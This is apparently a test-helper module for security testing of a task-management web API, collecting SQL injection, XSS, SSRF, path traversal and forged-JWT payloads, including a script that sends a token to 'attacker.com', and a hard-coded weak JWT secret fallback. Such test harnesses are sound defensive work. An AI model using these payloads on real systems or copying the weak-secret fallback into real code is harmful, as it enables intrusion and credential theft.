import jwt from 'jsonwebtoken';
import { PrismaClient } from '@prisma/client';
import { testUsers } from '../setup';

const prisma = new PrismaClient();

export interface TestUser {
  id: number;
  email: string;
  firstName: string;
  lastName: string;
}

export interface AuthTokens {
  user1Token: string;
  user2Token: string;
  adminToken: string;
}

/**
 * Generate JWT tokens for test users
 */
export const generateTestTokens = (users: { user1: TestUser; user2: TestUser; admin: TestUser }): AuthTokens => {
  const secret = process.env.JWT_SECRET || 'weak-secret-key';
  
  return {
    user1Token: jwt.sign(
      { userId: users.user1.id, email: users.user1.email },
      secret,
      { expiresIn: '1h' }
    ),
    user2Token: jwt.sign(
      { userId: users.user2.id, email: users.user2.email },
      secret,
      { expiresIn: '1h' }
    ),
    adminToken: jwt.sign(
      { userId: users.admin.id, email: users.admin.email, role: 'admin' },
      secret,
      { expiresIn: '1h' }
    )
  };
};

/**
 * Create test data for vulnerability testing
 */
export const createTestData = async (users: { user1: TestUser; user2: TestUser; admin: TestUser }) => {
  // Create test tasks
  const tasks = await Promise.all([
    prisma.task.create({
      data: {
        userId: users.user1.id,
        title: 'User 1 Confidential Task',
        description: 'This contains sensitive information for user 1',
        priority: 'HIGH',
        status: 'TODO'
      }
    }),
    prisma.task.create({
      data: {
        userId: users.user2.id,
        title: 'User 2 Secret Project',
        description: 'Classified project details for user 2',
        priority: 'URGENT',
        status: 'IN_PROGRESS'
      }
    }),
    prisma.task.create({
      data: {
        userId: users.admin.id,
        title: 'Admin System Task',
        description: 'Administrative system configuration task',
        priority: 'MEDIUM',
        status: 'TODO'
      }
    })
  ]);

  // Create test comments
  const comments = await Promise.all([
    prisma.comment.create({
      data: {
        taskId: tasks[0].id,
        userId: users.user1.id,
        content: 'Private comment from user 1'
      }
    }),
    prisma.comment.create({
      data: {
        taskId: tasks[1].id,
        userId: users.user2.id,
        content: 'Confidential note from user 2'
      }
    }),
    prisma.comment.create({
      data: {
        taskId: tasks[2].id,
        userId: users.admin.id,
        content: 'Admin system note'
      }
    })
  ]);

  return { tasks, comments };
};

/**
 * SQL injection payloads for testing
 */
export const sqlInjectionPayloads = {
  union: {
    userExtraction: "' UNION SELECT id, email, password_hash, first_name, last_name, created_at FROM users--",
    schemaEnum: "' UNION SELECT table_name, column_name, data_type, '1', '2', '3' FROM information_schema.columns WHERE table_schema='public'--",
    allTasks: "' UNION SELECT id, title, description, priority::text, status::text, user_id::text FROM tasks--"
  },
  boolean: {
    userExists: "' AND (SELECT COUNT(*) FROM users WHERE email = 'admin@test.com') > 0--",
    dataExtraction: "' AND (SELECT SUBSTRING(email, 1, 1) FROM users WHERE email LIKE 'admin%') = 'a'--"
  },
  error: {
    tableError: "' AND (SELECT * FROM non_existent_table)--",
    typeError: "' AND 1=CAST('invalid' AS INTEGER)--"
  },
  time: {
    delay: "'; SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN pg_sleep(1) ELSE pg_sleep(0) END--"
  },
  stacked: {
    dataManipulation: "'; INSERT INTO tasks (user_id, title, description, priority, status) VALUES (999, 'Injected Task', 'Created via SQL injection', 'HIGH', 'TODO'); --"
  }
};

/**
 * XSS payloads for testing
 */
export const xssPayloads = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>'
  ],
  advanced: [
    '<script>document.body.innerHTML="Hacked"</script>',
    '<script>fetch("/api/steal", {method:"POST", body:localStorage.token})</script>',
    '<script>new Image().src="http://attacker.com/steal?token=" + localStorage.getItem("token")</script>'
  ],
  bypass: [
    '<ScRiPt>alert("bypass")</ScRiPt>',
    '<script>eval("alert(\\"XSS\\")")</script>',
    '<script src="data:text/javascript,alert(\'XSS\')"></script>'
  ],
  encoded: [
    '&lt;script&gt;alert("encoded")&lt;/script&gt;',
    '&#60;script&#62;alert("numeric")&#60;/script&#62;',
    '%3Cscript%3Ealert("url")%3C/script%3E'
  ]
};

/**
 * SSRF payloads for testing
 */
export const ssrfPayloads = {
  cloudMetadata: [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
  ],
  internalNetwork: [
    'http://localhost:22',
    'http://localhost:80',
    'http://localhost:3306',
    'http://localhost:5432',
    'http://localhost:6379',
    'http://192.168.1.1',
    'http://10.0.0.1',
    'http://172.16.0.1'
  ],
  fileInclusion: [
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///proc/version',
    'file://../.env',
    'file://../package.json'
  ],
  protocols: [
    'ftp://ftp.example.com/',
    'gopher://localhost:70/',
    'dict://localhost:2628/',
    'ldap://localhost:389/'
  ]
};

/**
 * Path traversal payloads for testing
 */
export const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  '....//....//....//etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '../package.json',
  '../.env',
  '../src/server.ts'
];

/**
 * Weak JWT secrets for testing
 */
export const weakJWTSecrets = [
  'secret',
  'weak-secret-key',
  'password',
  '123456',
  'jwt-secret',
  'your-256-bit-secret',
  'default',
  'test'
];

/**
 * Generate malicious JWT tokens
 */
export const generateMaliciousTokens = (userId: number, email: string) => {
  return {
    privilegeEscalation: jwt.sign(
      { userId, email, role: 'admin', isAdmin: true },
      'weak-secret-key',
      { expiresIn: '1h' }
    ),
    expired: jwt.sign(
      { userId, email, exp: Math.floor(Date.now() / 1000) - 3600 },
      'weak-secret-key'
    ),
    noneAlgorithm: (() => {
      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ userId, email })).toString('base64url');
      return `${header}.${payload}.`;
    })(),
    forgedUser: jwt.sign(
      { userId: 999, email: 'admin@test.com' },
      'weak-secret-key',
      { expiresIn: '1h' }
    )
  };
};

/**
 * Vulnerability test result interface
 */
export interface VulnerabilityTestResult {
  vulnerability: string;
  testCase: string;
  success: boolean;
  details: any;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  cvss?: number;
}

/**
 * Generate vulnerability test report
 */
export const generateVulnerabilityReport = (results: VulnerabilityTestResult[]) => {
  const summary = {
    total: results.length,
    successful: results.filter(r => r.success).length,
    failed: results.filter(r => !r.success).length,
    bySeverity: {
      CRITICAL: results.filter(r => r.severity === 'CRITICAL').length,
      HIGH: results.filter(r => r.severity === 'HIGH').length,
      MEDIUM: results.filter(r => r.severity === 'MEDIUM').length,
      LOW: results.filter(r => r.severity === 'LOW').length
    }
  };

  return {
    summary,
    results,
    timestamp: new Date().toISOString(),
    vulnerabilityTypes: [...new Set(results.map(r => r.vulnerability))]
  };
};

/**
 * CVSS scoring helper
 */
export const calculateCVSS = (vulnerability: string): number => {
  const cvssScores: { [key: string]: number } = {
    'SQL Injection': 9.8,
    'XSS': 6.1,
    'IDOR': 8.1,
    'SSRF': 8.6,
    'Session Management': 7.5,
    'Path Traversal': 7.5,
    'Authentication Bypass': 9.1
  };

  return cvssScores[vulnerability] || 5.0;
};

/**
 * Clean up test data
 */
export const cleanupTestData = async () => {
  await prisma.comment.deleteMany();
  await prisma.task.deleteMany();
  await prisma.user.deleteMany();
};

export { prisma };